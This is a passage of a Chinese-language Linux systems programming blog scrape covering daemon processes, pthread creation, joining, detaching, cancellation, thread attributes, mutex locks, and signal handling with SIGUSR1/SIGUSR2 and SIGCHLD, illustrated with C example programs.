//文件重命名 rename(\"./mydaemon.log\", \"./mydaemon.log.bak\"); flag =0; &#125; &#125; close(fd); return 0;&#125; 守护进程的特点: &emsp;1 一个linux后台服务进程 &emsp;2 不依赖于控制终端 &emsp;3 周期性执行某些任务 &emsp; 4 不受用户登录和注销的影响 &emsp; 5 一般以d结尾 进程组和会话: 进程组: 一个进程包含多个进程 会话: 多个组组成一个会话. 创建会话的进程不能是组长进程; 一般创建会话是父进程先fork子进程, 然后父进程退出, 让子进程调用setsid函数 创建一个会话, 这个子进程既是会长也是组长; 只要是创建了会话, 这个进程就脱离了控制终端的影响. 创建守护进程模型: 1 父进程fork子进程, 然后父进程退出. 目的是: 子进程肯定不是组长进程, 为后续调用setsid函数提供了条件. 2 子进程调用setsid函数创建一个新的会话. 1 该子进程成了该会话的会长 2 该子进程成了该组的组长进程. 3 不再受控制终端的影响了 3 改变当前的工作目录, chdir -----不是必须的 4 重设文件掩码, umask(0000) -----不是必须的 5 关闭STDIN_FILENO STDOUT_FILENO STDERR_FILENO —不是必须的 6 核心操作 线程 2.1 什么是线程 轻量级的进程（LWP：light weight process），在Linux环境下线程的本质仍是进程。 进程：拥有独立的地址空间，拥有PCB，相当于独居。 线程：有PCB，但没有独立的地址空间，多个线程共享进程空间，相当于合租。 在Linux操作系统下： 线程：最小的执行单位 进程：最小分配资源单位，可看成是只有一个线程的进程。 线程的特点 类Unix系统中，早期是没有“线程”概念的，80年代才引入，借助进程机制实现出了线程的概念。因此在这类系统中，进程和线程关系密切。 线程是轻量级进程(light-weight process)，也有PCB，创建线程使用的底层函数和进程一样，都是clone 从内核里看进程和线程是一样的，都有各自不同的PCB. 进程可以蜕变成线程 在linux下，线程最是小的执行单位；进程是最小的分配资源单位 查看指定线程的LWP号：ps –Lf pid 实际上，无论是创建进程的fork，还是创建线程的pthread_create，底层实现都是调用同一个内核函数 clone。 如果复制对方的地址空间，那么就产出一个“进程”； 如果共享对方的地址空间，就产生一个“线程”。 so：Linux内核是不区分进程和线程的, 只在用户层面上进行区分。 所以，线程所有操作函数pthread_* 是库函数，而非系统调用。 2.2 线程共享资源 文件描述符表 每种信号的处理方式 当前工作目录 用户ID和组ID 内存地址空间 (.text/.data/.bss/heap/共享库) 2.3 线程非共享资源 线程id 处理器现场和栈指针(内核栈) 独立的栈空间(用户空间栈) errno变量 信号屏蔽字 调度优先级 2.4 线程优、缺点 优点： 提高程序并发性 开销小 数据通信、共享数据方便 缺点： 库函数，不稳定 gdb调试、编写困难 对信号支持不好 优点相对突出，缺点均不是硬伤。Linux下由于实现方法导致进程、线程差别不是很大。 2.5 pthread_create函数 头文件 1#include &lt;pthread.h&gt; 函数作用： 创建一个新线程 函数原型 12345678int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); 返回值 成功，返回0 失败，返回错误号 函数参数： pthread_t：传出参数，保存系统为我们分配好的线程ID 当前Linux中可理解为：typedef unsigned long int pthread_t。 attr：通常传NULL，表示使用线程默认属性。若想使用具体属性也可以修改该参数。 start_routine：函数指针，指向线程主函数(线程体)，该函数运行结束，则线程结束。 arg：线程主函数执行期间所使用的参数。 注意点 由于pthread_create的错误码不保存在errno中，因此不能直接用perror()打印错误信息，可以先用strerror()把错误码转换成错误信息再打印。strerror要包含头文件#include&lt;string.h&gt; 如果任意一个线程调用了exit或_exit，则整个进程的所有线程都终止，由于从main函数return也相当于调用exit，为了防止新创建的线程还没有得到执行就终止，我们在main函数return之前延时1秒，这只是一种权宜之计，即使主线程等待1秒，内核也不一定会调度新创建的线程执行，下一节我们会看到更好的办法。 练习题： 1 编写程序创建一个线程。 1234567#include &lt;pthread.h&gt;pthread_t pthread_self(void);函数作用：获得线程自身的ID。pthread_t的类型为unsigned long int，所以在打印的时候要使用%lu方式，否则显示结果出问题。pthread_self() //获取当前线程id 多线程编译是要指定库 1gcc xxx.c -l pthread -o xxx 1234567891011121314151617181920212223242526272829303132//创建子线程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self());&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, NULL, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //目的是为了让子线程能够执行起来 sleep(1); return 0;&#125; 2 编写程序创建一个线程，并给线程传递一个int参数 3 编写程序创建一个线程，并给线程传递一个结构体参数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//创建子线程: 传递参数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;struct Test&#123; int data; char name[64];&#125;;//线程执行函数void *mythread(void *arg)&#123; //int n = *(int *)arg; struct Test *p = (struct Test *)arg; //struct Test *p = arg; //printf(\"n==[%d]\\n\", n); printf(\"[%d][%s]\\n\", p-&gt;data, p-&gt;name); printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self());&#125;int main()&#123; int n = 99; struct Test t; memset(&amp;t, 0x00, sizeof(struct Test)); t.data = 88; strcpy(t.name, \"xiaowen\"); //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; //int ret = pthread_create(&amp;thread, NULL, mythread, &amp;n); int ret = pthread_create(&amp;thread, NULL, mythread, &amp;t); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //目的是为了让子线程能够执行起来 sleep(1); return 0;&#125; 4 编写程序，主线程循环创建5个子线程，并让子线程判断自己是第几个子线程。 练习4分析：最后每个子线程打印出来的值并不是想象中的值，比如都是5，分析其原因： 在创建子线程的时候使用循环因子作为参数传递给子线程，这样主线程和多个子线程就会共享变量i（变量i在main函数中定义，在整个进程都一直有效）所以在子线程看来变量i是合法的栈内存空间。 那么为什么最后每个子线程打印出来的值都是5呢? 是由于主线程可能会在一个cpu时间片内连续创建了5个子线程，此时变量i的值变成了5，当主线程失去cpu的时间片后，子线程得到cpu的时间片，子线程访问的是变量i的内存空间的值，所以打印出来值为5. 主线程和子线程共享同一块内存空间 主线程和子线程分时使用cpu资源 解决办法：不能使多个子线程都共享同一块内存空间，应该使每个子线程访问不同的内存空间，可以在主线程定义一个数组：int arr[5];，然后创建线程的时候分别传递不同的数组元素，这样每个子线程访问的就是互不相同的内存空间，这样就可以打印正确的值。 如下图： 多个子线程各自访问不同的内存空间 根据测试程序还可以得出结论： 如果主线程早于子线程退出，则子线程可能得不到执行，因为主线程退出，整个进程空间都会被回收，子线程没有了生存空间，所以也就得不到执行。 线程之间（包含主线程和子线程）可以共享同一变量，包含全局变量或者非全局变量（但是非全局变量必须在其有效的生存期内） 123456789101112131415161718192021222324252627282930313233343536373839404142//循环创建子线程,并且打印是第几个子线程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; int i = *(int *)arg; printf(\"[%d]:child thread, pid==[%d], id==[%ld]\\n\", i, getpid(), pthread_self()); sleep(100);&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 int ret; int i = 0; int n = 5; int arr[5]; pthread_t thread[5]; for(i=0; i&lt;n; i++) &#123; arr[i] = i; ret = pthread_create(&amp;thread[i], NULL, mythread, &amp;arr[i]); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //目的是为了让子线程能够执行起来 sleep(100); return 0;&#125; 2.6pthread_exit函数 在线程中禁止调用exit函数，否则会导致整个进程退出，取而代之的是调用pthread_exit函数，这个函数是使一个线程退出，如果主线程调用pthread_exit函数也不会使整个进程退出，不影响其他线程的执行。 函数描述 将单个线程退出 函数原型 void pthread_exit(void *retval); 函数参数 retval表示线程退出状态，通常传NULL 另注意，pthread_exit或者return返回的指针所指向的内存单元必须是全局的或者是用malloc分配的，不能在线程函数的栈上分配，因为当其它线程得到这个返回指针时线程函数已经退出了，栈空间就会被回收。 练习：编写程序测试pthread_exit函数使一个线程退出。 通过程序测试得知，pthread_exit函数只是使一个线程退出，假如子线程里面调用了exit函数，会使整个进程终止；如果主线程调用了pthread_exit函数，并不影响子线程，只是使主线程自己退出。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//线程退出函数测试#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;struct Test&#123; int data; char name[64];&#125;;int g_var = 9;struct Test t;//线程执行函数void *mythread(void *arg)&#123; printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //printf(\"[%p]\\n\", &amp;g_var); //pthread_exit(&amp;g_var); memset(&amp;t, 0x00, sizeof(t)); t.data = 99; strcpy(t.name, \"xiaowen\"); pthread_exit(&amp;t);&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, NULL, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //回收子线程 void *p = NULL; pthread_join(thread, &amp;p); //int n = *(int *)p; struct Test *pt = (struct Test *)p; printf(\"child exit status:[%d],[%s],[%p]\\n\", pt-&gt;data, pt-&gt;name, p); return 0;&#125; 2.7 pthread_join函数 函数描述：阻塞等待线程退出，获取线程退出状态。其作用，对应进程中的waitpid() 函数。 函数原型：int pthread_join(pthread_t thread, void **retval); 函数返回值： 成功：0； 失败：错误号 函数参数： thread：线程ID retval：存储线程结束状态，整个指针和pthread_exit的参数是同一块内存地址。 练习：编写程序，使主线程获取子线程的退出状态。 一般先定义void *ptr; 然后pthread_join(threadid, &amp;ptr); 2.8 pthread_detach函数 线程分离状态：指定该状态，线程主动与主控线程断开关系。线程结束后，其退出状态不由其他线程获取，而直接自己自动释放。网络、多线程服务器常用。 进程若有该机制，将不会产生僵尸进程。僵尸进程的产生主要由于进程死后，大部分资源被释放，一点残留资源仍存于系统中，导致内核认为该进程仍存在。 也可使用 pthread_create函数参2(线程属性)来设置线程分离。pthread_detach函数是在创建线程之后调用的。 函数描述 实现线程分离 函数原型 int pthread_detach(pthread_t thread); 函数返回值 成功：0； 失败：错误号 一般情况下，线程终止后，其终止状态一直保留到其它线程调用pthread_ join获取它的状态为止。但是线程也可以被置为detach状态，这样的线程一旦终止就立刻回收它占用的所有资源，而不保留终止状态。不能对一个已经处于detach状态的线程调用pthread_ join，这样的调用将返回EINVAL错误。也就是说，如果已经对一个线程调用了pthread_detach就不能再调用pthread_ join了。 练习：编写程序，在创建线程之后设置线程的分离状态。 说明：如果线程已经设置了分离状态，则再调用pthread_ join就会失败，可用这个方法验证是否已成功设置分离状态。 12345678910111213141516171819202122232425262728293031323334353637383940414243//设置子线程为分离属性#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); sleep(10);&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, NULL, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //设置线程为分离属性 pthread_detach(thread); //子线程设置分离属性,则pthread_join不再阻塞,立刻返回 ret = pthread_join(thread, NULL); if(ret!=0) &#123; printf(\"pthread_join error:[%s]\\n\", strerror(ret)); &#125; //目的是为了让子线程能够执行起来 sleep(1); return 0;&#125; 2.9 pthread_cancel函数 函数描述 杀死(取消)线程。其作用，对应进程中 kill() 函数。 函数原型 int pthread_cancel(pthread_t thread); 函数返回值 成功：0； 失败：错误号 【注意】：线程的取消并不是实时的，而有一定的延时。需要等待线程到达某个取消点(检查点)。 类似于玩游戏存档，必须到达指定的场所(存档点，如：客栈、仓库、城里等)才能存储进度。杀死线程也不是立刻就能完成，必须要到达取消点。 取消点：是线程检查是否被取消，并按请求进行动作的一个位置。通常是一些系统调用creat，open，pause，close，read，write… 执行命令man 7 pthreads可以查看具备这些取消点的系统调用列表。可粗略认为一个系统调用(进入内核)即为一个取消点。还以通过调用pthread_testcancel函数设置一个取消点。 函数原型：void pthread_testcancel(void); 练习：编写程序，让主线程取消子线程的执行。 先测试一下没有取消点看看能否使线程取消；然后调用pthread_testcancel设置一个取消点，看看能够使线程取消。 1234567891011121314151617181920212223242526272829303132333435363738394041424344//创建子线程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; while(1) &#123; int a; int b; //设置取消点 //pthread_testcancel(); //printf也有取消点 printf(\"-----\\n\"); &#125;&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, NULL, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //取消子线程 pthread_cancel(thread); pthread_join(thread, NULL); return 0;&#125; 2.10 pthread_equal函数 函数描述： 比较两个线程ID是否相等。 函数原型 int pthread_equal(pthread_t t1, pthread_t t2); 注意：这个函数是为了以能够扩展使用的， 有可能Linux在未来线程ID pthread_t类型被修改为结构体实现。 2.11 进程函数和线程函数比较 进程 线程 fork pthread_create exit pthread_exit wait/waitpid pthread_join kill pthread_cancel getpid pthread_self 12345678910111213141516171819202122232425262728293031323334353637383940414243//比较线程ID是否相等#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self());&#125;int main()&#123; //int pthread_create(pthread_t *thread, const pthread_attr_t *attr, // void *(*start_routine) (void *), void *arg); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, NULL, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //比较线程ID //if(pthread_equal(thread, pthread_self())!=0) if(pthread_equal(pthread_self(), pthread_self())!=0) &#123; printf(\"two thread id is same\\n\"); &#125; else &#123; printf(\"two thread id is not same\\n\"); &#125; //目的是为了让子线程能够执行起来 sleep(1); return 0;&#125; 3 线程属性 linux下线程的属性是可以根据实际项目需要，进行设置，之前讨论的线程都是采用线程的默认属性，默认属性已经可以解决绝大多数开发时遇到的问题，如果对程序的性能提出更高的要求，则需要设置线程属性，本节以设置线程的分离属性为例讲解设置线程属性。 线程的分离状态决定一个线程以什么样的方式来终止自己，有两种状态： 非分离状态：线程的默认属性是非分离状态，这种情况下，原有的线程等待创建的线程结束。只有当pthread_join()函数返回时，创建的线程才算终止，才能释放自己占用的系统资源。 分离状态：分离线程没有被其他的线程所等待，自己运行结束了，线程也就终止了，马上释放系统资源。应该根据自己的需要，选择适当的分离状态。 设置线程属性分为以下步骤 第1步：定义线程属性类型类型的变量 pthread_attr_t attr; 第2步：对线程属性变量进行初始化 int pthread_attr_init (pthread_attr_t* attr); 第3步：设置线程为分离属性 int pthread_attr_setdetachstate(pthread_attr_t *attr, int detachstate); 参数: attr: 线程属性 detachstate: PTHREAD_CREATE_DETACHED(分离) PTHREAD_CREATE_JOINABLE（非分离) 注意：这一步完成之后调用pthread_create函数创建线程， 则创建出来的线程就是分离线程；其实上述三步就是 pthread_create的第二个参数做准备工作。 第4步：释放线程属性资源 int pthread_attr_destroy(pthread_attr_t *attr); 参数：线程属性 练习：编写程序，创建一个分离属性的线程。 验证：设置为分离属性的线程是不能够被pthread_join函数回收的， 可以通过调用pthread_join函数测试该线程是否已经是分离属性的线程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//在创建子线程的时候设置分离属性#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//线程执行函数void *mythread(void *arg)&#123; printf(\"child thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); sleep(2);&#125;int main()&#123; //定义pthread_attr_t类型的变量 pthread_attr_t attr; //初始化attr变量 pthread_attr_init(&amp;attr); //设置attr为分离属性 pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_DETACHED); //创建子线程 pthread_t thread; int ret = pthread_create(&amp;thread, &amp;attr, mythread, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; printf(\"main thread, pid==[%d], id==[%ld]\\n\", getpid(), pthread_self()); //释放线程属性 pthread_attr_destroy(&amp;attr); //验证子线程是否为分离属性 ret = pthread_join(thread, NULL); if(ret!=0) &#123; printf(\"pthread_join error:[%s]\\n\", strerror(ret)); &#125; return 0;&#125; 4 线程同步 4.1 线程同步的概念 线程同步，指一个线程发出某一功能调用时，在没有得到结果之前，该调用不返回。同时其它线程为保证数据一致性，不能调用该功能。 4.2 线程同步的例子 创建两个线程，让两个线程共享一个全局变量int number， 然后让每个线程数5000次数，看最后打印出这个number值是多少？ 线程A代码片段： 线程B代码片段： 代码片段说明 代码中使用调用usleep是为了让两个子线程能够轮流使用CPU，避免一个子线程在一个时间片内完成5000次数数。 对number执行++操作，使用了中间变量cur是为了尽可能的模拟cpu时间片用完而让出cpu的情况。 测试结果 经过多次测试最后的结果显示，有可能会出现number值少于5000*2=10000的情况。 分析原因 假如子线程A执行完了cur++操作，还没有将cur的值赋值给number失去了cpu的执行权，子线程B得到了cpu执行权，而子线程B最后执行完了number=cur，而后失去了cpu的执行权；此时子线程A又重新得到cpu的执行权，并执行number=cur操作，这样会把线程B刚刚写回number的值被覆盖了，造成number值不符合预期的值。 数据混乱的原因 资源共享（独享资源则不会） 调度随机（线程操作共享资源的先后顺序不确定） 线程间缺乏必要的同步机制。 以上3点中，前两点不能改变，欲提高效率，传递数据，资源必须共享。只要共享资源，就一定会出现竞争。只要存在竞争关系，数据就很容易出现混乱。所以只能从第三点着手解决。使多个线程在访问共享资源的时候，出现互斥。 如何解决问题 原子操作的概念 原子操作指的是该操作要么不做，要么就完成。 使用互斥锁解决同步问题 使用互斥锁其实是模拟原子操作，互斥锁示意图： Linux中提供一把互斥锁mutex（也称之为互斥量）。每个线程在对资源操作前都尝试先加锁，成功加锁才能操作，操作结束解锁。 资源还是共享的，线程间也还是竞争的，但通过“锁”就将资源的访问变成互斥操作，而后与时间有关的错误也不会再产生了。 线程1访问共享资源的时候要先判断锁是否锁着，如果锁着就阻塞等待；若锁是解开的就将这把锁加锁，此时可以访问共享资源，访问完成后释放锁，这样其他线程就有机会获得锁。 应该注意：图中同一时刻，只能有一个线程持有该锁，只要该线程未完成操作就不释放锁。 ​ 使用互斥锁之后，两个线程由并行操作变成了串行操作，效率降低了，但是数据不一致的问题得到解决了。 4.3互斥锁主要相关函数 pthread_mutex_t类型 其本质是一个结构体，为简化理解，应用时可忽略其实现细节，简单当成整数看待。 pthread_mutex_t mutex;变量mutex只有两种取值1、0。 pthread_mutex_init函数 函数描述： 初始化一个互斥锁(互斥量) —&gt; 初值可看作1 函数原型： int pthread_mutex_init(pthread_mutex_t *restrict mutex, const pthread_mutexattr_t *restrict attr); 函数参数 mutex：传出参数，调用时应传&amp;mutex attr：互斥锁属性。是一个传入参数，通常传NULL，选用默认属性(线程间共享)。 restrict关键字：只用于限制指针，告诉编译器，所有修改该指针指向内存中内容的操作，只能通过本指针完成。不能通过除本指针以外的其他变量或指针修改互斥量mutex的两种初始化方式： 静态初始化：如果互斥锁 mutex 是静态分配的（定义在全局，或加了static关键字修饰），可以直接使用宏进行初始化。 pthead_mutex_t muetx = PTHREAD_MUTEX_INITIALIZER; 动态初始化：局部变量应采用动态初始化。 pthread_mutex_init(&amp;mutex, NULL); pthread_mutex_destroy函数 函数描述 销毁一个互斥锁 函数原型 int pthread_mutex_destroy(pthread_mutex_t *mutex); 函数参数 mutex—互斥锁变量 pthread_mutex_lock函数 函数描述 对互斥所加锁，可理解为将mutex-- 函数原型 int pthread_mutex_lock(pthread_mutex_t *mutex); 函数参数 mutex—互斥锁变量 pthread_mutex_unlock函数 函数描述 对互斥所解锁，可理解为将mutex ++ 函数原型 int pthread_mutex_unlock(pthread_mutex_t *mutex); pthread_mutex_trylock函数 函数描述 尝试加锁 函数原型 int pthread_mutex_trylock(pthread_mutex_t *mutex); 函数参数 mutex—互斥锁变量 4.4 加锁和解锁 lock尝试加锁，如果加锁不成功，线程阻塞，阻塞到持有该互斥量的其他线程解锁为止。 unlock主动解锁函数，同时将阻塞在该锁上的所有线程全部唤醒，至于哪个线程先被唤醒，取决于优先级、调度。默认：先阻塞、先唤醒。 练习：使用互斥锁解决两个线程数数不一致的问题。 代码片段：在访问共享资源前加锁，访问结束后立即解锁。锁的“粒度”应越小越好。 总结：使用互斥锁之后，两个线程由并行变为了串行，效率降低了，但是可以使两个线程同步操作共享资源，从而解决了数据不一致的问题。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;pthread.h&gt;#include&lt;string.h&gt;#define NUM 50000int number = 0;//初始化pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;;void * mythread1(void * arg)&#123; int i; int n; for(i = 0;i &lt; NUM;i++) &#123; //加锁 pthread_mutex_lock(&amp;mutex); n = number; n++; number = n; //解锁 pthread_mutex_unlock(&amp;mutex); printf(\"A: [%d]\\n\",number); &#125; return NULL;&#125;void * mythread2(void * arg)&#123; int i; int n; for(i = 0;i &lt; NUM;i++) &#123; //加锁 pthread_mutex_lock(&amp;mutex); n = number; n++; number = n; //解锁 pthread_mutex_unlock(&amp;mutex); printf(\"B: [%d]\\n\",number); &#125; return NULL;&#125;int main(int argc,char * argv[])&#123; pthread_t thread1; pthread_t thread2; int ret1 = pthread_create(&amp;thread1,NULL,mythread1,NULL); if(ret1 != 0) &#123; printf(\"pthread_create error: [%s]\\n\",strerror(ret1)); return ret1; &#125; int ret2 = pthread_create(&amp;thread2,NULL,mythread2,NULL); if(ret2 != 0) &#123; printf(\"pthread_create error: [%s]\\n\",strerror(ret2)); return ret2; &#125; void *retval1; void *retval2; int join_ret = pthread_join(thread1,&amp;retval1); if(join_ret != 0) &#123; printf(\"pthread_join error [%s]\\n\",strerror(join_ret)); &#125; int join_ret2 = pthread_join(thread2,&amp;retval2); if(join_ret2 != 0) &#123; printf(\"pthread_join error [%s]\\n\",strerror(join_ret2)); &#125; printf(\"number [%d]\",number); //释放锁 pthread_mutex_destroy(&amp;mutex); return 0;&#125; 互斥锁: 线程A和线程B共同访问共享资源, 当线程A想访问共享资源的时候, 要先获得锁, 如果锁被占用, 则加锁不成功需要阻塞等待对方释放锁; 若锁没有被占用, 则获得锁成功–加锁, 然后操作共享资源, 操作完之后, 必须解锁, 同理B也是和A一样. 也就是说, 同时不能有两个线程访问共享资源, 属于互斥操作.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"使用信号完成两个进程交替数数","slug":"linux081使用信号完成两个进程交替数数","date":"2022-01-23T12:30:23.000Z","updated":"2022-01-23T12:33:05.975Z","comments":true,"path":"2022/01/23/linux081使用信号完成两个进程交替数数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/23/linux081使用信号完成两个进程交替数数/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//使用SIGUSR1和SIGUSR2在父子进程间交替数数#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;errno.h&gt;int num = 0;int flag;void func1(int signo)&#123; printf(\"F:[%d]\\n\", num); num += 2; flag = 0; sleep(1);&#125;void func2(int signo)&#123; printf(\"C:[%d]\\n\", num); num += 2; flag = 0; sleep(1);&#125;int main(int argc, char *argv[])&#123; int ret; pid_t pid; pid = fork(); if(pid&lt;0) &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) &#123; num=0; flag = 1; signal(SIGUSR1, func1); while(1) &#123; if(flag==0) &#123; kill(pid, SIGUSR2); flag = 1; &#125; &#125; &#125; else if(pid==0) &#123; num=1; flag = 0; signal(SIGUSR2, func2); while(1) &#123; if(flag==0) &#123; kill(getppid(), SIGUSR1); flag = 1; &#125; &#125; &#125;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"SIGCHLD","slug":"linux080SIGCHLD","date":"2022-01-23T11:15:47.000Z","updated":"2022-01-23T12:29:57.968Z","comments":true,"path":"2022/01/23/linux080SIGCHLD/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/23/linux080SIGCHLD/","excerpt":"","text":"产生SIGCHLD信号的条件 子进程结束的时候 子进程收到SIGSTOP信号 当子进程停止时，收到SIGCONT信号 SIGCHLD信号的作用 ​ 子进程退出后，内核会给它的父进程发送SIGCHLD信号，父进程收到这个信号后可以对子进程进行回收。 ​ 使用SIGCHLD信号完成对子进程的回收可以避免父进程阻塞等待而不能执行其他操作，只有当父进程收到SIGCHLD信号之后才去调用信号捕捉函数完成对子进程的回收，未收到SIGCHLD信号之前可以处理其他操作。 1234567891011121314151617181920212223242526272829303132333435363738394041//对SIGCHLD信号测试#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;signal.h&gt;void sighandler(int signo)&#123; printf(\"signo==[%d]\\n\",signo);&#125;int main(int argc,char * argv[])&#123; pid_t pid = fork(); if(pid &lt; 0) &#123; perror(\"fork error\"); &#125; if(pid == 0) &#123; printf(\"child [%d]\\n\",pid); while(1) &#123; sleep(1); &#125; &#125; else if(pid &gt; 0) &#123; signal(SIGCHLD,sighandler); printf(\"fater [%d]\\n\",pid); while(1) &#123; sleep(1); &#125; &#125; return 0;&#125; 12kill -19 子进程id号 //对子进程发送SIGSTOP信号,然后产生SIGCHLD信号kill -18 子进程id号 //对子进程发送SIGCONT信号,然后产生SIGCHLD信号 使用SIGCHLD信号完成对子进程的回收 练习：父进程创建三个子进程，然后让父进程捕获SIGCHLD信号完成对子进程的回收。 注意点： 有可能还未完成信号处理函数的注册三个子进程都退出了。 解决办法：可以在fork之前先将SIGCHLD信号阻塞，当完成信号处理函数的注册后在解除阻塞。 当SIGCHLD信号函数处理期间, SIGCHLD信号若再次产生是被阻塞的,而且若产生了多次, 则该信号只会被处理一次, 这样可能会产生僵尸进程。 解决办法: 可以在信号处理函数里面使用while(1)循环回收, 这样就有可能出现捕获一次SIGCHLD信号但是回收了多个子进程的情况，从而可以避免产生僵尸进程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//父进程使用SICCHLD信号完成对子进程的回收#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;sys/wait.h&gt;void waitchild(int signo)&#123; pid_t wpid; //回收子进程 while(1) &#123; wpid = waitpid(-1, NULL, WNOHANG); if(wpid&gt;0) &#123; printf(\"child is quit, wpid==[%d]\\n\", wpid); &#125; else if(wpid==0) &#123; printf(\"child is living, wpid==[%d]\\n\", wpid); break; &#125; else if(wpid==-1) &#123; printf(\"no child is living, wpid==[%d]\\n\", wpid); break; &#125; &#125;&#125;int main()&#123; int i = 0; int n = 3; //将SIGCHLD信号阻塞 sigset_t mask; sigemptyset(&amp;mask); sigaddset(&amp;mask, SIGCHLD); sigprocmask(SIG_BLOCK, &amp;mask, NULL); for(i=0; i&lt;n; i++) &#123; //fork子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) //父进程 &#123; printf(\"father: fpid==[%d], cpid==[%d]\\n\", getpid(), pid); sleep(1); &#125; else 